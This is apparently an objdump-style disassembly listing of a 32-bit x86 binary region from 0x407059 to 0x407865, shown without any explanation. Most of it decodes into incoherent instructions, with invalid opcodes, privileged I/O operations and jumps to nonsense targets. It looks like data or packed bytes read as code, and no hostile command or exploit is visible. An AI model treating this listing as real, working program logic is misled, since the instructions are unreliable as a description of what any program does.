  407059:	add    al,0xf9
  40705b:	das    
  40705c:	ficomp DWORD PTR ds:0xfb4c407f
  407062:	jns    0x407065
  407064:	(bad)  
  407065:	(bad)  
  407066:	mov    edi,0xb0035fb4
  40706b:	std    
  40706c:	das    
  40706d:	or     ch,cl
  40706f:	mov    DWORD PTR [edi+0xd370e5a],esi
  407075:	scas   al,BYTE PTR es:[edi]
  407076:	sbb    DWORD PTR [edx+0x1f0d18d9],0x4e
  40707d:	lea    ecx,gs:[ecx+0x59d4196e]
  407084:	ret    0x2cd5
  407087:	dec    ecx
  407088:	pushf  
  407089:	popf   
  40708a:	push   eax
  40708b:	cwde   
  40708c:	pop    esp
  40708d:	adc    dl,BYTE PTR [eax-0x6305a585]
  407093:	shl    edx,1
  407095:	xchg   BYTE PTR [edi+edx*2-0x3e35c903],dl
  40709c:	adc    BYTE PTR [ecx],0xa9
  40709f:	dec    edi
  4070a0:	popf   
  4070a1:	repz (bad) 
  4070a4:	retf   0x2b79
  4070a7:	sbb    cl,BYTE PTR [edx]
  4070a9:	neg    BYTE PTR [edi-0x3a]
  4070ac:	popa   
  4070ad:	sbb    bh,BYTE PTR [esi-0x25]
  4070b0:	out    dx,eax
  4070b1:	mov    edi,0xdc3a15db
  4070b6:	inc    ebx
  4070b7:	cs cdq 
  4070b9:	mov    ds:0x9c1708ad,eax
  4070be:	jg     0x40707a
  4070c0:	adc    al,0x43
  4070c2:	pop    edx
  4070c3:	mov    eax,ds:0xe2be319f
  4070c8:	sub    eax,DWORD PTR ds:0xbe1087c8
  4070ce:	inc    esp
  4070cf:	push   es
  4070d0:	sub    BYTE PTR [esi],0x8d
  4070d3:	sbb    DWORD PTR [ebp+0x39],ebp
  4070d6:	adc    eax,edx
  4070d8:	mov    dl,0x21
  4070da:	sti    
  4070db:	sti    
  4070dc:	inc    edi
  4070dd:	or     al,0xc4
  4070df:	(bad)  
  4070e0:	push   ds
  4070e1:	push   0xffffff85
  4070e3:	xchg   ecx,eax
  4070e4:	jbe    0x4070eb
  4070e6:	pop    ebx
  4070e7:	xchg   BYTE PTR [edi+ecx*8],bh
  4070ea:	lahf   
  4070eb:	imul   ecx,DWORD PTR [ebp-0x7c274c72],0x19
  4070f2:	lea    edx,[eax+0x725a0c9]
  4070f8:	int3   
  4070f9:	or     al,0x97
  4070fb:	into   
  4070fc:	pop    es
  4070fd:	or     bl,ah
  4070ff:	mov    edx,0xf721194
  407104:	repz and al,0x89
  407107:	mov    al,0x4
  407109:	cmp    ch,bh
  40710b:	xor    BYTE PTR [eax+eiz*1-0x5703fc59],ah
  407112:	mov    esp,0x11d78501
  407117:	xor    eax,0x5a3d9507
  40711c:	mov    edx,0xdbedb7ee
  407121:	cmc    
  407122:	arpl   WORD PTR [edi-0x69c0ec3b],si
  407128:	lods   eax,DWORD PTR ds:[esi]
  407129:	mov    BYTE PTR cs:[esi],dh
  40712c:	aaa    
  40712d:	xchg   DWORD PTR [ebp+0x72a4fef],ebx
  407133:	adc    al,0x1d
  407135:	push   cs
  407136:	cmc    
  407137:	je     0x407151
  407139:	lds    ecx,FWORD PTR [edx+0x3b]
  40713c:	call   0xbaba516f
  407141:	jle    0x4070dd
  407143:	in     eax,dx
  407144:	mov    edi,esi
  407146:	lds    ebp,FWORD PTR [esi]
  407148:	aam    0xae
  40714a:	jb     0x4071b4
  40714c:	imul   DWORD PTR [esi-0x12]
  40714f:	push   edi
  407150:	or     eax,0xc5c2d1f1
  407155:	(bad)  
  407156:	test   eax,0xc5592ba6
  40715b:	into   
  40715c:	mov    fs,WORD PTR [eax]
  40715e:	enter  0x7c67,0xa4
  407162:	mov    ecx,0x1c21bb54
  407167:	cmp    DWORD PTR [esi+0x6c36a86d],esp
  40716d:	sbb    dl,BYTE PTR [edx]
  40716f:	clc    
  407170:	fild   QWORD PTR [esi]
  407172:	jecxz  0x4071f0
  407174:	jmp    0xc77ca9ee
  407179:	lods   al,BYTE PTR ds:[esi]
  40717a:	rcr    BYTE PTR [ebp-0x4c84fa3a],1
  407180:	inc    DWORD PTR ds:0x6fdf5dba
  407186:	push   edi
  407187:	push   ss
  407188:	sbb    esi,eax
  40718a:	aam    0x3a
  40718c:	push   es
  40718d:	iret   
  40718e:	sti    
  40718f:	ins    DWORD PTR es:[edi],dx
  407190:	(bad)  
  407191:	mov    dh,0x57
  407193:	mov    ds:0xfc59bf51,al
  407198:	dec    edi
  407199:	sbb    dl,ah
  40719b:	pop    ecx
  40719c:	shl    DWORD PTR [esi-0x407089d3],1
  4071a2:	dec    ebx
  4071a3:	mov    cl,0xf8
  4071a5:	lahf   
  4071a6:	push   eax
  4071a7:	loopne 0x4071ed
  4071a9:	call   0xdecb6ea6
  4071ae:	dec    edi
  4071af:	stc    
  4071b0:	shl    ecx,1
  4071b2:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  4071b4:	fidivr DWORD PTR [esi-0x6bce7f34]
  4071ba:	push   edi
  4071bb:	adc    BYTE PTR ss:[ebx],bl
  4071be:	stc    
  4071bf:	mov    ds:0x307ed5b4,eax
  4071c4:	mov    dl,0x55
  4071c6:	shr    BYTE PTR [edi+0x13e6b485],cl
  4071cc:	jp     0x4071f6
  4071ce:	inc    ecx
  4071cf:	mov    ch,BYTE PTR [ecx-0x51]
  4071d2:	test   eax,0xafa35086
  4071d7:	in     al,dx
  4071d8:	and    ecx,0xe6e754a2
  4071de:	adc    bh,bl
  4071e0:	fnstsw WORD PTR [eax]
  4071e2:	inc    ebp
  4071e3:	stc    
  4071e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4071e5:	adc    DWORD PTR [eax+0x5fbb9701],edi
  4071eb:	fcom   QWORD PTR [edx+0x7aa6e256]
  4071f1:	xlat   BYTE PTR ds:[ebx]
  4071f2:	sbb    al,0xb
  4071f4:	dec    eax
  4071f5:	mov    eax,ds:0x48366a5e
  4071fa:	cmp    dl,BYTE PTR ds:0xc621a399
  407200:	sub    dh,BYTE PTR [eax+0x25]
  407203:	xor    DWORD PTR [eax-0x77f80b2b],ecx
  407209:	outs   dx,BYTE PTR ds:[esi]
  40720a:	xchg   ax,ax
  40720c:	pop    ebp
  40720d:	enter  0xefd8,0xd5
  407211:	retf   
  407212:	jg     0x4071c1
  407214:	mul    BYTE PTR [esi]
  407216:	rcl    BYTE PTR [ecx+edx*8+0x718560cd],0xee
  40721e:	jmp    0x4071ff
  407220:	mov    cl,0xab
  407222:	mov    esp,0x845c212b
  407227:	adc    BYTE PTR [ecx-0x58],cl
  40722a:	ret    0x3535
  40722d:	sahf   
  40722e:	xchg   esi,eax
  40722f:	repnz xchg edx,eax
  407231:	inc    eax
  407232:	dec    edx
  407233:	dec    esi
  407234:	sar    DWORD PTR [edi],1
  407236:	retf   0x1bfa
  407239:	div    BYTE PTR [esi+0x770cdbf7]
  40723f:	lods   al,BYTE PTR ds:[esi]
  407240:	jle    0x4071f5
  407242:	sbb    al,0xa
  407244:	lea    ebx,[eax-0x42]
  407247:	cmp    edi,DWORD PTR [ecx]
  407249:	lock lock retf 0x811a
  40724e:	aad    0xfb
  407250:	mov    ecx,DWORD PTR [ecx*8+0x1a825fe1]
  407257:	div    bl
  407259:	xor    DWORD PTR [ebx-0x4d0bedd0],ebx
  40725f:	jmp    0x40727c
  407261:	dec    edx
  407262:	call   0x8326:0xfbf6424e
  407269:	sbb    DWORD PTR [ecx+edx*2],eax
  40726c:	sub    BYTE PTR [edi-0x96e5594],dl
  407272:	fdivr  DWORD PTR [eax+0x5]
  407275:	retf   
  407276:	push   0x902597fe
  40727b:	in     al,0x53
  40727d:	lea    edx,[ebx+esi*4+0x5c]
  407281:	cs add al,0x2
  407284:	mov    eax,ds:0xb95a607a
  407289:	ror    BYTE PTR [esi],cl
  40728b:	xchg   ebx,eax
  40728c:	ds jns 0x40723c
  40728f:	jns    0x4072c3
  407291:	stc    
  407292:	je     0x407284
  407294:	and    DWORD PTR ds:0x852778cc,ebp
  40729a:	push   esp
  40729b:	stos   BYTE PTR es:[edi],al
  40729c:	and    ebp,DWORD PTR [edx+0x22]
  40729f:	push   esi
  4072a0:	inc    esi
  4072a1:	mov    ebp,DWORD PTR [ecx+0x7e]
  4072a4:	mov    al,0x5f
  4072a6:	mov    ebp,0x62813625
  4072ab:	xor    dh,BYTE PTR [edi-0x66ac3976]
  4072b1:	and    esp,ecx
  4072b3:	dec    ebp
  4072b4:	dec    ebx
  4072b5:	sar    esi,1
  4072b7:	out    0xd9,eax
  4072b9:	out    0xc,al
  4072bb:	mov    ds:0xd53417cf,al
  4072c0:	pop    edi
  4072c1:	mov    al,0xd1
  4072c3:	nop
  4072c4:	dec    esi
  4072c5:	xor    BYTE PTR [ebx+0x5f],dl
  4072c8:	lods   al,BYTE PTR ds:[esi]
  4072c9:	repz das 
  4072cb:	jae    0x407293
  4072cd:	adc    dl,BYTE PTR [ebp+0x72]
  4072d0:	inc    edi
  4072d1:	sub    bl,BYTE PTR [eax-0x2dbd7950]
  4072d7:	lahf   
  4072d8:	adc    DWORD PTR [eiz*1-0x38bd5719],esp
  4072df:	mov    edx,0xabb878f
  4072e5:	or     eax,0x3ce85c53
  4072ea:	rol    BYTE PTR [ebx],1
  4072ec:	arpl   cx,bp
  4072ee:	repz inc ebp
  4072f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4072f1:	jno    0x407357
  4072f3:	retf   0x633d
  4072f6:	mov    dh,0x2
  4072f8:	scas   al,BYTE PTR es:[edi]
  4072f9:	bound  ebx,QWORD PTR [eax-0x43]
  4072fc:	add    bl,BYTE PTR [ebx-0x37]
  4072ff:	add    DWORD PTR [ecx],edx
  407301:	inc    ecx
  407302:	test   BYTE PTR [ebp-0x27de8d3a],0xa7
  407309:	ret    0xb1fd
  40730c:	or     al,0x8b
  40730e:	stos   BYTE PTR es:[edi],al
  40730f:	jecxz  0x40737c
  407311:	pusha  
  407312:	mov    esi,0x41db0abb
  407317:	push   es
  407318:	imul   ebx,ebp,0x77e784ed
  40731e:	jl     0x4072c2
  407320:	aam    0x26
  407322:	sbb    eax,0x5f4ed458
  407327:	aad    0x70
  407329:	jns    0x407357
  40732b:	pop    ebx
  40732c:	add    DWORD PTR [ecx-0x76b769e6],eax
  407332:	adc    ebp,DWORD PTR [esi+edx*1-0x6b]
  407336:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407337:	dec    ecx
  407338:	aaa    
  407339:	(bad)  
  40733a:	jmp    DWORD PTR [ebx+eiz*2-0x36]
  40733e:	and    DWORD PTR [ebx-0x2b],ebp
  407341:	mov    WORD PTR [esi],fs
  407343:	mov    bh,0x1f
  407345:	or     eax,0x6abc502e
  40734a:	cmp    ah,bh
  40734c:	into   
  40734d:	jge    0x4072e7
  40734f:	test   BYTE PTR [edx],ch
  407351:	push   cs
  407352:	and    dh,BYTE PTR [ecx+0x19]
  407355:	cwde   
  407356:	cmp    BYTE PTR [ecx-0x2ee1ac09],0x76
  40735d:	int3   
  40735e:	jge    0x407350
  407360:	repnz sbb DWORD PTR [ecx-0x65],edi
  407364:	arpl   WORD PTR [ebx],bx
  407366:	mov    ch,0x3
  407368:	sub    DWORD PTR [ebp+0x58],ecx
  40736b:	or     eax,0x844eb8b2
  407370:	stos   BYTE PTR es:[edi],al
  407371:	iret   
  407372:	je     0x4073ba
  407374:	inc    ecx
  407375:	sub    edi,DWORD PTR [ebx+0x58c182ef]
  40737b:	dec    edi
  40737c:	imul   ebx,esp,0xc58d4b0c
  407382:	push   0x654fa6d4
  407387:	cwde   
  407388:	push   cs
  407389:	(bad)  
  40738a:	jmp    0x407327
  40738c:	push   edx
  40738d:	lods   al,BYTE PTR ds:[esi]
  40738e:	or     edi,DWORD PTR [edi+0x66]
  407391:	push   ss
  407392:	and    eax,0x17b82e9
  407397:	jge    0x40732c
  407399:	sbb    dl,BYTE PTR [esi]
  40739b:	dec    edi
  40739c:	cld    
  40739d:	in     al,dx
  40739e:	jmp    0x4073b4
  4073a0:	pop    edi
  4073a1:	(bad)  
  4073a2:	repz sbb eax,0xc912fa80
  4073a8:	or     al,0xd
  4073aa:	xor    al,0xce
  4073ac:	cdq    
  4073ad:	sub    DWORD PTR [ecx-0x35c90e13],0x70
  4073b4:	sbb    BYTE PTR [edi+ebp*1+0x1],0xe9
  4073b9:	jne    0x40733d
  4073bb:	lods   eax,DWORD PTR ds:[esi]
  4073bc:	mov    al,0x3a
  4073be:	jne    0x407413
  4073c0:	mov    ebp,0x6edba5be
  4073c5:	and    al,0xe3
  4073c7:	and    DWORD PTR [edi+0x563591cf],edx
  4073cd:	xor    BYTE PTR [ebx+eax*2],bl
  4073d0:	dec    esi
  4073d1:	push   ebx
  4073d2:	and    al,0x1c
  4073d4:	jmp    0x7952:0x8ddb5f11
  4073db:	jecxz  0x407439
  4073dd:	icebp  
  4073de:	push   ss
  4073df:	xchg   al,dh
  4073e1:	xor    eax,0xed58b493
  4073e6:	or     dh,BYTE PTR [edx+edx*8-0xe]
  4073ea:	imul   edi,DWORD PTR [edi+0x6ff00df4],0xb77e850f
  4073f4:	sub    DWORD PTR [esi+edi*8],esi
  4073f7:	and    DWORD PTR [eax+edx*4+0x3cd60b81],0x6ae1f9f1
  407402:	dec    edi
  407403:	sbb    eax,0x9e75337f
  407408:	int3   
  407409:	xor    DWORD PTR [edx],ebp
  40740b:	xlat   BYTE PTR ds:[ebx]
  40740c:	push   esp
  40740d:	pusha  
  40740e:	(bad)  
  40740f:	jmp    FWORD PTR [ebp+edx*8+0xdf18af1]
  407416:	popa   
  407417:	adc    DWORD PTR [edx+0x75],edx
  40741a:	ins    BYTE PTR es:[edi],dx
  40741b:	fwait
  40741c:	sub    DWORD PTR [ebx+0x75],esp
  40741f:	add    DWORD PTR [ebp+0x2e],0x46d09fdc
  407426:	sti    
  407427:	xchg   ecx,eax
  407428:	xor    eax,0x481688e1
  40742d:	inc    ecx
  40742e:	(bad)  
  40742f:	scas   eax,DWORD PTR es:[edi]
  407430:	inc    edi
  407431:	adc    DWORD PTR [ecx],edi
  407433:	pusha  
  407434:	fstp   DWORD PTR [eax]
  407436:	imul   ebp,DWORD PTR [esi-0xe],0xfeb5258
  40743d:	mov    edi,0x2ecdcb48
  407442:	fist   WORD PTR [edx-0x4b]
  407445:	pusha  
  407446:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407447:	mov    eax,ds:0xc7212bee
  40744c:	loop   0x40748f
  40744e:	xchg   ebx,eax
  40744f:	(bad)  
  407450:	loopne 0x4074ac
  407452:	inc    eax
  407453:	pop    ebp
  407454:	nop
  407455:	mov    ebp,0xf6b5bc03
  40745a:	emms   
  40745c:	mov    ds:0x61c127e7,al
  407461:	imul   edx,DWORD PTR [eax+0x562964c2],0x65
  407468:	pop    esi
  407469:	jb     0x4074ac
  40746b:	sbb    dh,bl
  40746d:	out    dx,eax
  40746e:	fbld   TBYTE PTR [ebp-0x68]
  407471:	push   es
  407472:	push   ds
  407473:	lds    edx,FWORD PTR [ecx-0x20267278]
  407479:	arpl   WORD PTR [ebx],bp
  40747b:	mov    DWORD PTR [esi+esi*4-0x3c],eax
  40747f:	or     DWORD PTR [esi+0x2ecff11e],edx
  407485:	cmp    BYTE PTR fs:[edx+ecx*2],0x68
  40748a:	jne    0x407418
  40748c:	xchg   edi,esi
  40748e:	push   ecx
  40748f:	mov    al,0xef
  407491:	or     al,0xfd
  407493:	jbe    0x4074f1
  407495:	inc    esp
  407496:	stos   BYTE PTR es:[edi],al
  407497:	dec    eax
  407498:	out    dx,eax
  407499:	mov    esp,0x516d459e
  40749e:	mov    al,ds:0xa98729a1
  4074a3:	xchg   ecx,eax
  4074a4:	out    dx,eax
  4074a5:	loope  0x407441
  4074a7:	or     bl,BYTE PTR [edi-0x30]
  4074aa:	push   eax
  4074ab:	push   ds
  4074ac:	sbb    BYTE PTR [ebp-0x44f82aa6],al
  4074b2:	lock pop ds
  4074b4:	pop    edi
  4074b5:	sub    esi,ebp
  4074b7:	mov    esp,0x55d5a4e6
  4074bc:	pop    edx
  4074bd:	rol    BYTE PTR [edi],1
  4074bf:	pop    esi
  4074c0:	test   eax,0x9aec1af6
  4074c5:	js     0x4074d9
  4074c7:	(bad)  
  4074c8:	aad    0x82
  4074ca:	inc    BYTE PTR [edx+0x4c489a5a]
  4074d0:	mov    bl,0x58
  4074d2:	mov    DWORD PTR [ebp+0x1068ab3d],ecx
  4074d8:	mov    ebp,0x4e921e40
  4074dd:	retf   0x6fb9
  4074e0:	inc    edx
  4074e1:	mov    ecx,0x2631260f
  4074e6:	inc    edx
  4074e7:	cmp    esp,ebp
  4074e9:	retf   0xd2a6
  4074ec:	and    eax,0x88681cee
  4074f1:	out    0x27,al
  4074f3:	jns    0x40753e
  4074f5:	dec    esi
  4074f6:	mov    ah,0x34
  4074f8:	xor    bl,bl
  4074fa:	xor    DWORD PTR [esi-0x68150799],esp
  407500:	pop    ebx
  407501:	sbb    bl,dh
  407503:	pop    eax
  407504:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407505:	jg     0x40755b
  407507:	pminub mm6,QWORD PTR [edi-0x2f]
  40750b:	pusha  
  40750c:	ret    
  40750d:	mov    BYTE PTR ds:0x210148da,al
  407513:	mov    ebp,0xe12f8530
  407518:	iret   
  407519:	not    DWORD PTR [esi]
  40751b:	sbb    DWORD PTR [eax+0x65d5b70e],ebp
  407521:	loop   0x407599
  407523:	nop
  407524:	mov    ss,edi
  407526:	fcom   DWORD PTR [ecx-0x8d2880a]
  40752c:	test   al,0x84
  40752e:	test   DWORD PTR ds:0xa0f3602f,0xe337c2e7
  407538:	fld    QWORD PTR [edi]
  40753a:	jb     0x40751b
  40753c:	push   ecx
  40753d:	jl     0x407580
  40753f:	jecxz  0x4074fb
  407541:	das    
  407542:	aam    0xb8
  407544:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407545:	clc    
  407546:	and    BYTE PTR [esi+eax*2-0x4b27257e],bh
  40754d:	adc    dh,BYTE PTR [edx+0x2]
  407550:	sub    DWORD PTR [eax+0x13],0x83d2f751
  407557:	gs add eax,0xcf14a6ee
  40755d:	push   esi
  40755e:	outs   dx,DWORD PTR ds:[esi]
  40755f:	cld    
  407560:	(bad)  
  407561:	inc    ecx
  407562:	push   0xffffff92
  407564:	jae    0x407576
  407566:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407567:	cmp    edx,DWORD PTR [esi]
  407569:	jo     0x407596
  40756b:	cmp    ebx,DWORD PTR ds:0x69466f8d
  407571:	test   al,0x65
  407573:	fdivr  QWORD PTR [esi-0x32]
  407576:	repnz rcr BYTE PTR [edx+0x51d7e973],1
  40757d:	xchg   edi,eax
  40757e:	push   esp
  40757f:	add    DWORD PTR [edi-0x4c],0x62
  407583:	inc    edx
  407584:	xchg   ebp,eax
  407585:	jg     0x4075f0
  407587:	xchg   edx,eax
  407588:	loop   0x407540
  40758a:	sub    BYTE PTR [edi],bh
  40758c:	enter  0x9479,0xbb
  407590:	repz inc ebx
  407592:	js     0x407578
  407594:	lock xor eax,0x432e80f1
  40759a:	test   al,0x10
  40759c:	inc    ecx
  40759d:	xchg   edx,eax
  40759e:	push   edx
  40759f:	pop    esi
  4075a0:	push   0x2a
  4075a2:	add    edx,0xf799c111
  4075a8:	and    ch,ch
  4075aa:	inc    ecx
  4075ab:	cmp    esp,edi
  4075ad:	mov    bh,0x82
  4075af:	js     0x407621
  4075b1:	test   DWORD PTR [edi+edi*4],ecx
  4075b4:	mov    esi,0x6decde23
  4075b9:	cmp    eax,0xe3d42ca9
  4075be:	adc    eax,0xe9516aae
  4075c3:	(bad)  
  4075c4:	retf   
  4075c5:	retf   0xc9e3
  4075c8:	ins    BYTE PTR es:[edi],dx
  4075c9:	adc    DWORD PTR [ebx],ecx
  4075cb:	imul   ecx,DWORD PTR [edx-0x7625a179],0xa265feb4
  4075d5:	arpl   WORD PTR [edx+0x5],cx
  4075d8:	fisub  WORD PTR [eax]
  4075da:	inc    edi
  4075db:	jbe    0x407613
  4075dd:	loop   0x40759c
  4075df:	mov    ecx,0xc799410d
  4075e4:	xor    eax,0x9cd944cd
  4075e9:	aaa    
  4075ea:	mov    eax,ds:0x87b53bed
  4075ef:	outs   dx,BYTE PTR ds:[esi]
  4075f0:	lods   eax,DWORD PTR ds:[esi]
  4075f1:	dec    ecx
  4075f2:	inc    ebx
  4075f3:	or     DWORD PTR [ecx],ebx
  4075f5:	mov    ebp,0x99fb091c
  4075fa:	outs   dx,BYTE PTR ds:[esi]
  4075fb:	jnp    0x4075a6
  4075fd:	(bad)  
  4075fe:	fldcw  WORD PTR [ecx+0x26f15df2]
  407604:	div    BYTE PTR [eax+0x62d627b8]
  40760a:	jns    0x407665
  40760c:	in     al,0xd
  40760e:	dec    eax
  40760f:	dec    eax
  407610:	ror    BYTE PTR [edi+0x52],0xfc
  407614:	mov    esp,0x482f623c
  407619:	sub    edi,DWORD PTR [ebx+0x70]
  40761c:	jl     0x407610
  40761e:	dec    ebx
  40761f:	mov    al,0x26
  407621:	lods   al,BYTE PTR ds:[esi]
  407622:	aaa    
  407623:	add    esp,DWORD PTR [edx-0x6a79846f]
  407629:	fwait
  40762a:	ret    
  40762b:	pushf  
  40762c:	sub    edx,DWORD PTR [ebp-0xc875b]
  407632:	cmp    eax,0x4278a4fa
  407637:	ror    edi,cl
  407639:	lods   al,BYTE PTR ds:[esi]
  40763a:	mov    dh,0xcf
  40763c:	imul   ebx,ecx,0x2a
  40763f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407640:	add    BYTE PTR [ecx-0x4d],dl
  407643:	ss (bad) 
  407645:	ss icebp 
  407647:	fs push ebp
  407649:	mov    ecx,0x556a45bc
  40764e:	dec    ecx
  40764f:	dec    DWORD PTR [ebp+edi*4-0x44]
  407653:	pusha  
  407654:	xchg   edi,eax
  407655:	adc    bl,0xb9
  407658:	cwde   
  407659:	ja     0x40761a
  40765b:	out    dx,eax
  40765c:	mov    DWORD PTR [edx],edi
  40765e:	mov    ch,0x40
  407660:	or     ebx,edi
  407662:	sub    al,0x55
  407664:	aaa    
  407665:	or     esi,ebp
  407667:	or     eax,0x38471ba8
  40766c:	mov    ebx,0x9bcb4e4a
  407671:	mov    eax,0x43f8d545
  407676:	jmp    0x4076e1
  407678:	xor    cl,bh
  40767a:	inc    edi
  40767b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40767c:	out    0xb7,al
  40767e:	jp     0x407633
  407680:	pop    ss
  407681:	dec    eax
  407682:	mov    ebx,0xf1dc95d0
  407687:	push   0xffffff8e
  407689:	push   ss
  40768a:	sub    ch,BYTE PTR [ebx+0xc]
  40768d:	mov    eax,ds:0xc18e524f
  407692:	sub    eax,0x7d1ae855
  407697:	dec    esi
  407698:	rcl    ch,cl
  40769a:	sbb    eax,0x8b1fbde6
  40769f:	xchg   ebx,eax
  4076a0:	sub    BYTE PTR [ecx+0x758fbf77],al
  4076a6:	fbstp  TBYTE PTR [edx+eax*8+0x2c5d9261]
  4076ad:	mov    fs,WORD PTR [ebp-0x69]
  4076b0:	ror    BYTE PTR ds:0xca294e9d,0x6e
  4076b7:	sub    DWORD PTR [edi],eax
  4076b9:	imul   ecx,DWORD PTR [edx+0x71fe69d5],0x64
  4076c0:	loopne 0x4076cf
  4076c2:	jnp    0x40771c
  4076c4:	ja     0x4076f5
  4076c6:	adc    bl,BYTE PTR [ebp+0x7b]
  4076c9:	push   ebp
  4076ca:	or     edi,esi
  4076cc:	fldcw  WORD PTR [edx+ecx*4-0x1d]
  4076d0:	out    0xb5,al
  4076d2:	loope  0x40766f
  4076d4:	inc    ebp
  4076d5:	cld    
  4076d6:	ins    DWORD PTR es:[edi],dx
  4076d7:	arpl   WORD PTR [ecx+0x7a],ax
  4076da:	pushf  
  4076db:	mov    edx,0x8206c438
  4076e0:	sub    DWORD PTR [edi-0x1a],ebp
  4076e3:	ja     0x4076e4
  4076e5:	jne    0x40771a
  4076e7:	sub    ch,BYTE PTR [edx]
  4076e9:	leave  
  4076ea:	pop    eax
  4076eb:	lods   eax,DWORD PTR ds:[esi]
  4076ec:	cld    
  4076ed:	lods   eax,DWORD PTR ds:[esi]
  4076ee:	dec    ecx
  4076ef:	mov    bl,BYTE PTR [esi-0x12]
  4076f2:	xor    BYTE PTR [ebx+0x48431828],bh
  4076f8:	or     bh,ah
  4076fa:	pop    es
  4076fb:	add    BYTE PTR [eax],bh
  4076fd:	bound  ecx,QWORD PTR [eax]
  4076ff:	jge    0x407706
  407701:	loopne 0x40771b
  407703:	inc    ebx
  407704:	mov    cl,0x3c
  407706:	mov    al,ds:0xcbf03ae
  40770b:	and    eax,0x1e9948f3
  407710:	pop    ecx
  407711:	pop    edi
  407712:	mov    ecx,0x56cb479d
  407717:	inc    esi
  407718:	add    eax,0x5349c872
  40771d:	or     dl,BYTE PTR [ebp-0x3a994f8a]
  407723:	sbb    BYTE PTR ds:0x7dc89db0,dl
  407729:	ins    BYTE PTR es:[edi],dx
  40772a:	dec    edi
  40772b:	(bad)  
  40772c:	jne    0x40770d
  40772e:	pop    ebx
  40772f:	ror    BYTE PTR [ebp+0x22],1
  407732:	pop    ecx
  407733:	stos   DWORD PTR es:[edi],eax
  407734:	fimul  WORD PTR [edi]
  407736:	cld    
  407737:	xchg   ebx,eax
  407738:	mov    ebp,0xe650d790
  40773d:	pop    ecx
  40773e:	in     al,0xca
  407740:	jae    0x407707
  407742:	pop    edi
  407743:	test   eax,0x3993e2ec
  407748:	repnz inc BYTE PTR [eax]
  40774b:	jl     0x40776a
  40774d:	push   ebx
  40774e:	pop    ss
  40774f:	push   esi
  407750:	test   edi,esp
  407752:	push   ss
  407753:	into   
  407754:	es inc esi
  407756:	push   ss
  407757:	cmp    ebp,0x3b242b05
  40775d:	pop    ebx
  40775e:	(bad)  
  40775f:	jo     0x407770
  407761:	jg     0x4076f1
  407763:	push   esp
  407764:	dec    edx
  407765:	ins    DWORD PTR es:[edi],dx
  407766:	shr    esp,0xd5
  407769:	xor    esp,DWORD PTR [edi-0x39]
  40776c:	dec    edx
  40776d:	sbb    DWORD PTR [ebp+0x79b7dfc0],esi
  407773:	dec    ecx
  407774:	push   esi
  407775:	jo     0x4077a2
  407777:	iret   
  407778:	call   0xc67e:0x75047e0d
  40777f:	pop    edi
  407780:	mov    ebp,esi
  407782:	sub    ch,al
  407784:	rol    DWORD PTR [ebx+0x4c],cl
  407787:	add    ah,BYTE PTR [esp+edx*8]
  40778a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40778b:	dec    esi
  40778c:	adc    eax,0x51df09c
  407791:	out    dx,al
  407792:	pop    eax
  407793:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407794:	mov    ebp,0x484212c7
  407799:	adc    eax,0x18b1d6bf
  40779e:	cwde   
  40779f:	(bad)  
  4077a0:	popa   
  4077a1:	faddp  st(0),st
  4077a3:	push   es
  4077a4:	ret    
  4077a5:	enter  0x65e,0xb1
  4077a9:	mov    eax,0xfe7ffdef
  4077ae:	scas   al,BYTE PTR es:[edi]
  4077af:	and    eax,0x48a5c4a3
  4077b4:	xchg   BYTE PTR [edx-0x5199d301],cl
  4077ba:	jbe    0x40777c
  4077bc:	inc    esi
  4077bd:	mov    ebp,0x4b2ecb8f
  4077c2:	call   0xc53e43a8
  4077c7:	je     0x407831
  4077c9:	adc    al,BYTE PTR [eax+eax*2-0x50]
  4077cd:	stc    
  4077ce:	xor    ah,BYTE PTR [edx+0x17]
  4077d1:	nop
  4077d2:	xor    BYTE PTR [ebx],cl
  4077d4:	xchg   edx,eax
  4077d5:	sub    al,0x3
  4077d7:	sbb    eax,0x76cb1c5
  4077dc:	push   eax
  4077dd:	int3   
  4077de:	cmp    al,0x94
  4077e0:	mov    dl,0x9b
  4077e2:	popf   
  4077e3:	xchg   edx,esp
  4077e5:	cmp    ebp,DWORD PTR [esi]
  4077e7:	inc    eax
  4077e8:	es push cs
  4077ea:	data16 mov ch,0x76
  4077ed:	jmp    0x407793
  4077ef:	and    BYTE PTR [edx+0x2c8dc64c],al
  4077f5:	push   edx
  4077f6:	jg     0x4077cf
  4077f8:	mov    BYTE PTR [edi],dh
  4077fa:	cmp    eax,0xc8d15f2e
  4077ff:	loop   0x4077d9
  407801:	fstp   TBYTE PTR [edi+0x37a36691]
  407807:	sub    DWORD PTR [edx-0x9],edx
  40780a:	inc    edi
  40780b:	sar    DWORD PTR [ebp-0x6d4809b3],1
  407811:	xchg   ecx,eax
  407812:	dec    edx
  407813:	(bad)  
  407814:	xor    eax,0xe63b7e45
  407819:	ins    BYTE PTR es:[edi],dx
  40781a:	push   esi
  40781b:	mov    edx,0x8714e365
  407820:	int3   
  407821:	adc    bh,BYTE PTR [edi]
  407823:	js     0x4077ac
  407825:	test   eax,0xe89d6464
  40782a:	pop    edx
  40782b:	jae    0x40785d
  40782d:	jp     0x407891
  40782f:	or     DWORD PTR [ebp+0x24a7f2e],ebx
  407835:	add    DWORD PTR [ecx+0xd356f6c],edi
  40783b:	or     ebp,ebx
  40783d:	pusha  
  40783e:	adc    DWORD PTR [esi+0x18],ebx
  407841:	enter  0x4e05,0x36
  407845:	xchg   ecx,eax
  407846:	jg     0x4077e5
  407848:	pop    ds
  407849:	shl    ebp,cl
  40784b:	scas   eax,DWORD PTR es:[edi]
  40784c:	ds jmp 0x4078c2
  40784f:	les    edi,FWORD PTR [ebx*1-0x5088550d]
  407856:	cvtpi2ps xmm2,mm6
  407859:	popa   
  40785a:	dec    esp
  40785b:	je     0x4077df
  40785d:	addr16 mov eax,0x884a1525
  407863:	test   al,0xb6
  407865:	xchg   ecx,eax
